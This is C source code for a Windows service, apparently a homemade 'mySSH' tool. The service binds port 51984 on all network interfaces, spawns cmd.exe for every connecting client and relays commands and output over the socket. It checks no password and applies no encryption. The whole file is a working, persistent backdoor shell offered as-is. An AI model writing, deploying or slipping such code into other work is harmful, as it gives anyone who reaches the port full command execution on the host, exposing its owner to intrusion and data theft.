#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <stdio.h>
#include <tchar.h>
#include <string.h>
#pragma comment(lib, "ws2_32.lib")

#define SERVICE_NAME  _T("mySSH")
#define PORT 51984
#define BUFFER_SIZE 1000

// Global variables
SERVICE_STATUS g_ServiceStatus;
SERVICE_STATUS_HANDLE g_StatusHandle;
HANDLE g_ServiceStopEvent = NULL;
HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;
HANDLE g_hInputFile = NULL;
SOCKET ClientSocket;

 //Function prototypes
void WINAPI ServiceMain(DWORD argc, LPTSTR* argv);
void WINAPI ServiceCtrlHandler(DWORD CtrlCode);
DWORD WINAPI ServerThread(LPVOID lpParam);
void HandleClient(SOCKET client_socket);
void CleanUp(HANDLE hReadPipe, HANDLE hWritePipe, PROCESS_INFORMATION* pi);
void CreateChildProcess();

DWORD WINAPI WriteToPipe(LPDWORD dummy) {
    UNREFERENCED_PARAMETER(dummy);

    DWORD dwWritten, iResult;
    CHAR chBuf[BUFFER_SIZE] = "";

    while(1){
        BOOL bSuccess = FALSE;
        for (DWORD i = 0; i < BUFFER_SIZE; ++i)
            chBuf[i] = 0;
        while (!(iResult = recv(ClientSocket, chBuf, BUFFER_SIZE, 0)));
        if (iResult < 0) {
            printf("recv failed with error: %d\n", WSAGetLastError());
            return 1;
        }

        bSuccess = WriteFile(g_hChildStd_IN_Wr, chBuf, strlen(chBuf), &dwWritten, NULL);
        if (!bSuccess || !dwWritten) {
            return 0;
        }
    }
    return 0;
}

DWORD WINAPI ReadFromPipe(LPDWORD dummy) {
    UNREFERENCED_PARAMETER(dummy);
    DWORD dwRead, dwWritten, iSendResult;
    CHAR chBuf[BUFFER_SIZE + 1];

    for (;;) {
        BOOL bSuccess = FALSE;

        for (;;) {
            bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFFER_SIZE, &dwRead, NULL);
            if (!bSuccess) {
                return 1;
            }

            chBuf[dwRead] = 0;

            iSendResult = send(ClientSocket, chBuf, dwRead, 0);
            if (iSendResult == SOCKET_ERROR) {
                return 2;
            }
        }
    }
    return 0;
}

void CloseConnection(void) {
    DWORD iResult = shutdown(ClientSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ClientSocket);
        WSACleanup();
        perror("Shutdown Failed");
    }
    closesocket(ClientSocket);
    WSACleanup();
}

// Handle a single client connection
void HandleClient(SOCKET ClientSocket) {
    TCHAR buffer[BUFFER_SIZE];

    SECURITY_ATTRIBUTES saAttr;

    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;


    if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0))
    {
        perror("StdoutRd CreatePipe");
        return;
    }

    if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
    {
        perror("Stdout SetHandleInformation");
        return;
    }

    if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0))
    {
        perror("Stdin CreatePipe");
        return;
    }

    if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
    {
        perror("Stdin SetHandleInformation");
        return;
    } 

    CreateChildProcess();

    DWORD dwWritten, iResult;
    DWORD dwRead, iSendResult;
    CHAR chBuf[BUFFER_SIZE] = "";

    BOOL bSuccess = FALSE;

    HANDLE threads[2];
    threads[0] = CreateThread(NULL, 0, WriteToPipe, NULL, 0, NULL);
    threads[1] = CreateThread(NULL, 0, ReadFromPipe, NULL, 0, NULL);

    WaitForMultipleObjects(2, threads, TRUE, INFINITE);

    for (int i = 0; i < 2; ++i)
        CloseHandle(threads[i]);

    CloseConnection();


}

void CreateChildProcess()
{
    TCHAR szCmdline[] = TEXT("cmd.exe");
    PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;
    BOOL bSuccess = FALSE;

    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = g_hChildStd_OUT_Wr;
    siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
    siStartInfo.hStdInput = g_hChildStd_IN_Rd;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    bSuccess = CreateProcess(NULL,
        szCmdline,     // command line 
        NULL,          // process security attributes 
        NULL,          // primary thread security attributes 
        TRUE,          // handles are inherited 
        0,             // creation flags 
        NULL,          // use parent's environment 
        NULL,          // use parent's current directory 
        &siStartInfo,  // STARTUPINFO pointer 
        &piProcInfo);  // receives PROCESS_INFORMATION 

    // If an error occurs, exit the application. 
    if (!bSuccess)
    {
        perror("CreateProcess");
        return;
    }
    else
    {
        CloseHandle(piProcInfo.hProcess);
        CloseHandle(piProcInfo.hThread);

        CloseHandle(g_hChildStd_OUT_Wr);
        CloseHandle(g_hChildStd_IN_Rd);
    }
}

void CleanUp(HANDLE hReadPipe, HANDLE hWritePipe, PROCESS_INFORMATION* pi) {
    CloseHandle(hReadPipe);
    CloseHandle(hWritePipe);
    TerminateProcess(pi->hProcess, 0);
    CloseHandle(pi->hProcess);
    CloseHandle(pi->hThread);
}

// Function to execute the server logic
void runServer() {
    WSADATA wsaData;
    SOCKET serverSocket;
    struct sockaddr_in serverAddr, clientAddr;
    int addrLen = sizeof(clientAddr);
    char buffer[BUFFER_SIZE];
    char result[BUFFER_SIZE];

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return;
    }

    // Create socket
    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    // Bind socket
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(PORT);
    if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(serverSocket);
        WSACleanup();
        return;
    }

    // Listen for connections
    listen(serverSocket, 3);

    // Accept a connection
    while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0) {
        ClientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &addrLen);
        if (ClientSocket == INVALID_SOCKET) {
            continue; // Retry on error
        }

        HandleClient(ClientSocket);

        closesocket(ClientSocket);
    }

    closesocket(serverSocket);
    WSACleanup();
}

// Entry point for the service
void WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
    g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
    if (!g_StatusHandle) {
        return;
    }

    // Notify SCM that the service is starting
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;
    g_ServiceStatus.dwWaitHint = 3000; // 3 seconds
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    // Create an event to signal service stop
    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (!g_ServiceStopEvent) {
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        g_ServiceStatus.dwWin32ExitCode = GetLastError();
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        return;
    }

    // Notify SCM that the service is running
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    g_ServiceStatus.dwCheckPoint = 0;
    g_ServiceStatus.dwWaitHint = 0;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    // Start the server logic in a separate thread
    HANDLE hThread = CreateThread(NULL, 0, ServerThread, NULL, 0, NULL);
    if (!hThread) {
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        g_ServiceStatus.dwWin32ExitCode = GetLastError();
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        return;
    }

    // Wait for the stop event
    WaitForSingleObject(g_ServiceStopEvent, INFINITE);

    CloseHandle(hThread);
    CloseHandle(g_ServiceStopEvent);

    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

void WINAPI ServiceCtrlHandler(DWORD CtrlCode) {
    switch (CtrlCode) {
    case SERVICE_CONTROL_STOP:
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

        SetEvent(g_ServiceStopEvent);
        break;

    default:
        break;
    }
}

DWORD WINAPI ServerThread(LPVOID lpParam) {
    runServer();
    return 0;
}

int main() {
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };

    if (!StartServiceCtrlDispatcher(ServiceTable)) {
        printf("Error: %lu\n", GetLastError());
    }

    return 0;
}
